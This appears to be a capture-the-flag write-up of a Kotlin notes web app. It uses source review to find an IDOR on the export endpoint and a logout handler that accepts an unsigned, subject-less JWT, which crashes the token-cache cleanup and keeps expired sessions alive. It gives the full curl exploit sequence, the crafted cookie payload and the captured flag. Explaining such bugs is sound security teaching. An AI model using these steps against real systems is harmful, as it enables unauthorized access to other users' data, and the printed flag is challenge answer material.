---
title: "Another Notes App"
ctf: "Kashi CTF 2026"
date: "2026-04-03"
description: "A Kotlin web app authentication vulnerability"
points: 500
views: 0
tags: ["Web"]
---

## tl;dr

This challenge came with both a live instance and a source archive, `another-notes-chall.tgz`. Since the app was small and the instance had a short lifetime, reading the source was the fastest path to a reliable exploit.

**Challenge points:** 500

## Recon

Initial HTTP recon showed a simple note application:

```bash
curl -i -s http://34.126.223.46:17029/
```

The app redirected immediately to `/login`, and from there the flow looked like:

- `/register`
- `/login`
- `/notes`
- Create / delete notes
- Request a notes export

The archive contents were:

```
handout/src/main/kotlin/just/some/ctf/notestwo/Application.kt
handout/src/main/kotlin/just/some/ctf/notestwo/db/Database.kt
handout/src/main/kotlin/just/some/ctf/notestwo/auth/JwtConfig.kt
handout/src/main/kotlin/just/some/ctf/notestwo/auth/TokenCache.kt
handout/src/main/kotlin/just/some/ctf/notestwo/views/NotesViews.kt
```

---

## Reading the Code

The most important file was `Database.kt`. It initializes an in-memory H2 database and creates a seeded user:

```kotlin
val ownerPassword =
    ByteArray(32).also { SecureRandom().nextBytes(it) }.joinToString("") { "%02x".format(it) }
println("Owner password: $ownerPassword")
val ownerId = Users.insert {
    it[username] = "owner"
    it[passwordHash] = hashPassword(ownerPassword)
} get Users.id

val flag = File("/flag.txt").readText() ?: TODO()
Notes.insert {
    it[userId] = ownerId.value
    it[content] = "Something something $flag"
    it[createdAt] = System.currentTimeMillis()
}
```

This immediately told us:

1. The flag is inside the seeded `owner` account's note.
2. The `owner` password is random each startup — logging in normally is not possible.
3. The intended solve must be a logic bug that lets us read `owner`'s notes anyway.

---

## Finding the Vulnerable Route

The main logic in `Application.kt` exposed this export endpoint:

```kotlin
post("/notes/request-download") {
    val session = call.sessions.get<UserSession>()
    if (session == null) {
        call.respond(HttpStatusCode.Unauthorized, "Not authenticated")
        return@post
    }

    val claims = tokenCache.verifyToken(session.token)
    if (claims == null) {
        call.respond(HttpStatusCode.Unauthorized, "Invalid session")
        return@post
    }

    val params = call.receiveParameters()
    val requestedUsername = params["username"] ?: ""

    if (downloadPermissions.containsKey(session.token)) {
        val grantedTime = downloadPermissions[session.token]!!
        if (grantedTime <= System.currentTimeMillis()) {
            val user = UserService.getUserByUsername(requestedUsername)
            if (user != null) {
                val notes = NoteService.getUserNotes(user.id)
                call.respondText(
                    notes.joinToString("\n") { "- ${it.content}" },
                    ContentType.Text.Plain
                )
            }
        } else {
            call.respondText("Your request for data download is being processed, check back in a few moments.")
        }
    } else {
        val grantedTime = System.currentTimeMillis() + (300 * 1000)
        downloadPermissions[session.token] = grantedTime
        call.respondText("Your request for data download is being processed, check back in a few moments.")
    }
}
```

This is a classic **IDOR**:

- The route accepts an arbitrary `username` parameter.
- It does **not** enforce that `requestedUsername` matches the logged-in user.
- After the delay expires, it returns that user's notes.

So in principle the exploit is straightforward:

1. Log in as any user.
2. Start a download request for `owner`.
3. Wait 5 minutes.
4. Reuse the same session token.
5. Receive `owner`'s notes, including the flag.

---

## The Second Bug — Token Cache Lifetime

```kotlin
val token = JwtConfig.generateToken(user.username)
tokenCache.cacheToken(token, JwtConfig.verifyToken(token)!!)
```

All auth checks use an in-memory cache:

```kotlin
fun verifyToken(token: String): Claims? {
    return cache[token]
}
```

Tokens only stay valid while present in this cache. JWT validity is only **3 minutes**:

```kotlin
private const val validityInMs = 3 * 60_000
```

So the normal 5-minute download timer would outlive the session, making the IDOR unreachable under normal timing. The intended path requires keeping a token alive past its expiry by breaking the token-cache cleanup logic.

---

## Breaking the Token Cache

The bug lives in `TokenCache.kt`:

```kotlin
private fun processLogoutInline(token: String) {
    // Full validation isn't needed as the user can't impersonate others without token
    JwtConfig.parseWithoutValidation(token)?.let {
        val username = JwtConfig.getUsername(it)
        UserService.getUserByUsername(username).let {
            cache.remove(token)
        }
    }
}
```

And `parseWithoutValidation()` in `JwtConfig.kt`:

```kotlin
fun parseWithoutValidation(token: String): Claims? {
    return try {
        val parts = token.split(".")
        if (parts.size != 3) return null
        val unsignedToken = parts[0] + "." + parts[1] + "."
        Jwts.parserBuilder()
            .build()
            .parseClaimsJwt(unsignedToken)
            .body
    } catch (e: Exception) {
        null
    }
}
```

The logout endpoint queues the session token without validating it first:

```kotlin
post("/logout") {
    val session = call.sessions.get<UserSession>()
    val token = session?.token
    token?.let {
        tokenCache.processLogout(it)
    }
    call.sessions.clear<UserSession>()
    call.respondRedirect("/login")
}
```

**The key weakness:**

- The logout path does not verify the token before queueing it.
- The background cleanup coroutine later calls `JwtConfig.getUsername(it)`.
- If the parsed claims have no `sub`, `claims.subject` is invalid and **crashes the coroutine**.

Once that coroutine dies, expired tokens are **never removed** from the in-memory cache — making the 5-minute delayed export reachable with a token that should have expired after 3 minutes.

---

## Exploit Steps

### Step 1 — Register a normal user

```bash
curl -s -X POST -d 'username=alice&password=alicepass' \
  http://34.126.223.46:17029/register -D -
```

This returns a valid `SESSION` cookie containing Alice's token.

### Step 2 — Start the export request for `owner`

```bash
curl -i -s \
  -H 'Cookie: SESSION=<alice-session-cookie>' \
  -X POST \
  -d 'username=owner' \
  http://34.126.223.46:17029/notes/request-download
```

Response:

```
Your request for data download is being processed, check back in a few moments.
```

### Step 3 — Send a crafted logout to kill the cleanup coroutine

Craft a JWT with no `sub` claim. The cookie body is JSON:

```json
{"token":"eyJhbGciOiAiSFMyNTYifQ.e30.x"}
```

URL-encoded for the cookie header:

```
%7B%22token%22%3A%20%22eyJhbGciOiAiSFMyNTYifQ.e30.x%22%7D
```

Send it:

```bash
curl -i -s \
  -H 'Cookie: SESSION=%7B%22token%22%3A%20%22eyJhbGciOiAiSFMyNTYifQ.e30.x%22%7D' \
  -X POST \
  http://34.126.223.46:17029/logout
```

This queues a malformed token for logout processing and kills the background cleanup task.

### Step 4 — Wait past the 3-minute JWT expiry

Alice's token should expire but remains in the cache since the cleanup task is dead.

### Step 5 — Wait until the 5-minute export timer has passed, then collect the notes

```bash
curl -i -s \
  -H 'Cookie: SESSION=<alice-session-cookie>' \
  -X POST \
  -d 'username=owner' \
  http://34.126.223.46:17029/notes/request-download
```

Response:

```
- Something something kashiCTF{67358e160ab0c131916f0c05aebf8aff_D7aCaWyo6C}}
```

---

## Flag

```
kashiCTF{67358e160ab0c131916f0c05aebf8aff_D7aCaWyo6C}}
```

---

## Key Takeaways

- A delayed action can still be exploitable if sessions are cached incorrectly.
- In-memory token caches are dangerous when they become the real source of truth instead of cryptographic verification.
- "No need to validate on logout" is a bad assumption — logout handlers still process attacker-controlled input.
- A background cleanup coroutine is part of the attack surface if malformed state can crash it.
- The actual data leak was an IDOR on `requestedUsername`; the token-cache bug only made the timing practical.
